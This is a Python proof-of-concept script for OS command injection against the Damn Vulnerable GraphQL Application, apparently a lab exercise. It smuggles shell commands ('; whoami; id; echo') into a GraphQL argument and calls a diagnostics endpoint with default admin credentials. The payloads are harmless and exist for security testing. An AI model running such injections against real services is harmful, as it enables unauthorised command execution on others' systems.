#!/usr/bin/env python3
"""
dvga_challenge_04_os_command_injection.py — OS command injection.

DVGA has two OS-command sinks (core/views.py):
  * `systemDebug(arg)`            -> helpers.run_cmd('ps {}'.format(arg))
      The `arg` is appended verbatim to `ps` and executed via os.popen().
      NO auth, NO mode gate  ->  "OS Command Injection #1" (always available).
  * `systemDiagnostics(u,p,cmd)`  -> helpers.run_cmd(cmd)
      Gated by admin creds AND security.allowed_cmds(cmd) (easy mode: anything;
      hard mode: only echo/ps/whoami/tail) -> "OS Command Injection #2".

RELIABLE signal: the response echoes shell output we injected — our marker
(from `echo`), the current user (`whoami`/`id`), or process-list fragments.
We keep the command set harmless and print only the relevant fragment, not the
full process table / /etc/passwd.
Run: python3 dvga_challenge_04_os_command_injection.py [--config ...]
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import dvga_common as dv


def find_config():
    if os.path.exists("dvga_config.yaml"):
        return "dvga_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "dvga_config.yaml")


MARKER = "DVGA_OSI_MARKER_"


def main():
    ap = argparse.ArgumentParser(description="OS command injection (systemDebug / systemDiagnostics)")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = dv.load_config(args.config)
    base = dv.base_url(cfg)
    tout = dv.timeout(cfg)
    hdrs = dv.consumer_headers(804)

    def probe(query, note):
        r = dv.graphql(base, query, None, cfg, hdrs, tout)
        if r is None:
            print(f"{note:34} -> transport error")
            return False
        body = r.json() if r.headers.get("content-type", "").find("json") >= 0 else {}
        blob = " ".join((e.get("message") or "") for e in (body.get("errors") or []))
        data = body.get("data") or {}
        data_blob = " ".join(str(v) for v in data.values())
        text = (blob + " " + data_blob).lower()
        marker = MARKER.lower() in text
        whoami = any(k in text for k in ("whoami", "uid=", "nobody", "root", "daemon", "ps aux", "aux "))
        signal = marker or whoami
        frag = (blob or data_blob)[:160]
        print(f"{note:34} -> {'[SIGNAL: shell output reflected]' if signal else 'no shell echo'} | {frag!r}")
        return signal

    hits = 0

    # --- OS Command Injection #1: systemDebug(arg) -> ps <arg> (no gate). ---
    marker = MARKER + "abc"
    hits += 1 if probe(
        'query { systemDebug(arg: "aux; whoami; id; echo ' + marker + '") }',
        "systemDebug(aux;whoami;id;echo)") else 0

    # --- OS Command Injection #2: systemDiagnostics(cmd) (cred + mode gated). ---
    hits += 1 if probe(
        'query { systemDiagnostics(username: "admin", password: "changeme", '
        'cmd: "echo ' + marker + '") }',
        "systemDiagnostics(echo)") else 0

    hits += 1 if probe(
        'query { systemDiagnostics(username: "admin", password: "changeme", '
        'cmd: "whoami; id") }',
        "systemDiagnostics(whoami;id)") else 0

    print(f"\nDone — {hits}/3 probe(s) reflected shell output.")
    if hits:
        print("[FINDING] systemDebug / systemDiagnostics execute attacker-supplied input via a shell — "
              "remote OS command injection (RCE).")
    else:
        print("[ok] no shell-output echo observed (creds/mode may have blocked the sink).")


if __name__ == "__main__":
    main()
